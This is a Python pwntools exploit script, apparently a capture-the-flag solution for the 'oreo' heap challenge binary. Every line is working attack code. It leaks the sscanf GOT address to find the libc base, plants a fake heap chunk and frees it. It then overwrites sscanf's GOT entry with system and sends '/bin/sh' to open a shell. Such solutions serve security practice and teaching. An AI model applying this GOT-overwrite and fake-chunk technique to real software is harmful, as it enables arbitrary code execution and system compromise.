#coding:utf-8
from pwn import *

context.log_level = "debug"

def add(name, descrip):
    p.readuntil("Action:")
    p.sendline("1")
    p.readuntil("name:")
    p.sendline(name)
    p.readuntil("description:")
    p.sendline(descrip)

def show_rifles():
    p.readuntil("Action:")
    p.sendline("2")
    p.readuntil("Name: ")
    p.readuntil("Name: ")
    return u32(p.read(4))

def free():
    p.readuntil("Action:")
    p.sendline("3")

def leave(message):
    p.readuntil("Action:")
    p.sendline("4")
    p.readuntil("order: ")
    p.sendline(message)


sscanf_got = 0x804A258
fake_heap = 0x804A2A0
system_offset = 0x3ada0

p = process("oreo", stdin=PTY)

gdb.attach(p)
name_payload1 = "aaa" + "bbbb"*6 + p32(sscanf_got-25)
add(name_payload1, "hhh")
sscanf = show_rifles()
libc_base = sscanf - 0x5c4c0
for x in xrange(0x40-1):
    add("mm", "gg")

name_payload2 = "aaa" + "bbbb"*6 + p32(fake_heap+8)
add(name_payload2, "uuu")
message_payload = "\x00\x00\x00\x00"*9 + p32(0x41)
leave(message_payload)
# raw_input()

free()
# raw_input()
add("name", p32(sscanf_got))
leave(p32(libc_base+system_offset))
p.sendline("/bin/sh\0")
p.interactive()
